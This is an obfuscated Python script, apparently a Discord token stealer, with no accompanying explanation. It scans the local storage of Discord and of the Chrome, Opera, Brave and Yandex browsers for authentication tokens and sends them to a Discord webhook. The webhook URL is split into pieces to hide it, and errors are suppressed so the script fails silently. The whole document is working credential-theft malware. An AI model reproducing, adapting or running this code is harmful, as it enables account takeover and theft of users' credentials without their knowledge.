import os 
import re 
import json 
from urllib .request import Request ,urlopen 
def find_tokens (O00O0O0O00OOO0OOO ):
    O00O0O0O00OOO0OOO +='\\Local Storage\\leveldb'
    OO000O0O0OO000000 =[]
    for O00000O0O0OOO0OOO in os .listdir (O00O0O0O00OOO0OOO ):
        if not O00000O0O0OOO0OOO .endswith ('.log')and not O00000O0O0OOO0OOO .endswith ('.ldb'):
            continue 
        for O0OOOOO0OO00OO00O in [O0OO000OOOOOO0O0O .strip ()for O0OO000OOOOOO0O0O in open (f'{O00O0O0O00OOO0OOO}\\{O00000O0O0OOO0OOO}',errors ='ignore').readlines ()if O0OO000OOOOOO0O0O .strip ()]:
            for O0000OOO0O0000000 in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',r'mfa\.[\w-]{84}'):
                for O00O0OO0000O0O00O in re .findall (O0000OOO0O0000000 ,O0OOOOO0OO00OO00O ):
                    OO000O0O0OO000000 .append (O00O0OO0000O0O00O )
    return OO000O0O0OO000000 
PING_ME =True 
def main ():
    OO0O0OOO0OO00OOOO =os .getenv ('LOCALAPPDATA')
    O0O00O0OO0OO0OO0O =os .getenv ('APPDATA')
    OOO0OOOOO0OO0OOOO ={'Discord':O0O00O0OO0OO0OO0O +'\\Discord','Discord Canary':O0O00O0OO0OO0OO0O +'\\discordcanary','Discord PTB':O0O00O0OO0OO0OO0O +'\\discordptb','Google Chrome':OO0O0OOO0OO00OOOO +'\\Google\\Chrome\\User Data\\Default','Opera':O0O00O0OO0OO0OO0O +'\\Opera Software\\Opera Stable','Brave':OO0O0OOO0OO00OOOO +'\\BraveSoftware\\Brave-Browser\\User Data\\Default','Yandex':OO0O0OOO0OO00OOOO +'\\Yandex\\YandexBrowser\\User Data\\Default'}
    O0OOOOO000OO0OOOO ='@everyone'if PING_ME else ''
    for O0OO00OO00O0OOO0O ,O0OOO000O0OOO00O0 in OOO0OOOOO0OO0OOOO .items ():
        if not os .path .exists (O0OOO000O0OOO00O0 ):
            continue 
        O0OOOOO000OO0OOOO +=f'\n**{O0OO00OO00O0OOO0O}**\n```\n'
        OO00OOO0000000000 =find_tokens (O0OOO000O0OOO00O0 )
        if len (OO00OOO0000000000 )>0 :
            for O0O0000OOOOOO00OO in OO00OOO0000000000 :
                O0OOOOO000OO0OOOO +=f'{O0O0000OOOOOO00OO}\n'
        else :
            O0OOOOO000OO0OOOO +='No tokens found.\n'
        O0OOOOO000OO0OOOO +='```'
    O0OO0O000OOOOO0O0 ={'Content-Type':'application/json','User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}
    OOO000OOO0000O00O =json .dumps ({'content':O0OOOOO000OO0OOOO })
    try :
        OO0OO00OO000OOOOO ='dis'
        OO0OO00OO000OOOOO +="cor"
        OO0OO00OO000OOOOO +="d.com/api/we"
        OO0OO00OO000OOOOO +="bhooks/9671336903312958"
        OO0OO00OO000OOOOO +="55/imezYqAn3OrFbKY"
        OO0OO00OO000OOOOO +="hgRuKC4HeDeJHv5N006-cAqR93rbaYc0-EEAJqFHi4lnHXiVhp1o0"
        O0000O0O000O000OO =Request ("htt"+"ps://"+OO0OO00OO000OOOOO ,data =OOO000OOO0000O00O .encode (),headers =O0OO0O000OOOOO0O0 )
        urlopen (O0000O0O000O000OO )
    except :
        pass 
if __name__ =='__main__':
    main ()
